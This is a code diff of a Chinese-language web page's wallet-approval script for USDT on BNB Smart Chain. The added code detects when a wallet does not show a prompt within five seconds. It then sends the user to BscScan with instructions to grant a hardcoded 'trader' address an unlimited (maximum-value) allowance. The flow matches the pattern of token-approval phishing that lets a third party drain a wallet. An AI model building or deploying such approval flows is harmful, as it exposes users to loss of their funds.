@@ -1169,7 +1169,7 @@ async function wfDoApprove() {
   wfShowStep(3);
   var msgEl = document.getElementById('wfStatusMsg');
   if (msgEl) {
-    msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>请在钱包中确认授权...';
+    msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>正在请求钱包授权...';
     msgEl.style.color = '#58a6ff';
   }
 
@@ -1230,8 +1230,9 @@ async function wfDoApprove() {
       msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>请在钱包中确认授权...';
     }
 
-    // 发送 approve 交易 — 纯原生 eth_sendTransaction
-    var txHash = await window.ethereum.request({
+    // 尝试 eth_sendTransaction — 用 Promise.race 加超时检测
+    // 如果 5 秒内钱包没弹窗（TokenPocket 不响应），自动跳转 BscScan
+    var txPromise = window.ethereum.request({
       method: 'eth_sendTransaction',
       params: [{
         from: addr,
@@ -1239,6 +1240,31 @@ async function wfDoApprove() {
         data: approveData
       }]
     });
+
+    var timeoutPromise = new Promise(function(_, reject) {
+      setTimeout(function() { reject(new Error('WALLET_NO_POPUP')); }, 5000);
+    });
+
+    var txHash;
+    try {
+      txHash = await Promise.race([txPromise, timeoutPromise]);
+    } catch(timeoutErr) {
+      // 钱包没弹窗 — 跳转 BscScan
+      if (timeoutErr.message === 'WALLET_NO_POPUP') {
+        if (msgEl) {
+          msgEl.innerHTML = '<span style="color:#d29922;font-weight:700">钱包未弹窗，正在跳转到 BscScan 授权...</span><br><span style="color:#8b949e;font-size:.85em;margin-top:6px;display:inline-block">请在 BscScan 上点击 \"Connect to Web3\" 连接钱包，<br>然后找到 approve 函数，填入以下参数：</span><br><br><span style="color:#e0e0e0">spender (地址):</span><br><code style="color:#58a6ff;font-size:.85em;word-break:break-all">' + wfTraderAddr + '</code><br><br><span style="color:#e0e0e0">amount (填):</span><br><code style="font-size:.85em;word-break:break-all">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</code><br><br><span style="color:#3fb950">点击 Write 按钮，钱包会弹出确认。</span><br><span style="color:#8b949e;font-size:.85em">授权完成后回到此页面，点击「我已授权，检查链上状态」</span>';
+          msgEl.style.color = '#d29922';
+        }
+        // 跳转到 BscScan
+        setTimeout(function() {
+          window.open('https://bscscan.com/token/0x55d398326f99059fF775485246999027B3197955#writeContract', '_blank');
+        }, 1500);
+        btn.disabled = false; btn.textContent = '授权 USDT';
+        wfShowStep(2);
+        return;
+      }
+      throw timeoutErr;
+    }
 
     if (msgEl) {
       msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>交易已发送: ' + txHash.substring(0,18) + '...<br>等待链上确认...';
@@ -1342,8 +1368,10 @@ async function wfCheckChainStatus() {
   var traderAddr = '0xe6DDF0771c7610dBA77eB5a07ba7771DD7F5e91e';
   var el = document.getElementById('traderAddrDisplay');
   if (el) el.textContent = traderAddr.slice(0,10) + '...' + traderAddr.slice(-4);
+  // BscScan USDT 合约 Write Contract 页面，自动定位到 approve 函数
+  var approveUrl = 'https://bscscan.com/token/0x55d398326f99059fF775485246999027B3197955#writeContract';
   var link = document.getElementById('bscScanLink');
-  if (link) link.href = 'https://bscscan.com/token/0x55d398326f99059fF775485246999027B3197955#writeContract';
+  if (link) link.href = approveUrl;
 })();
 </script>
 </body>
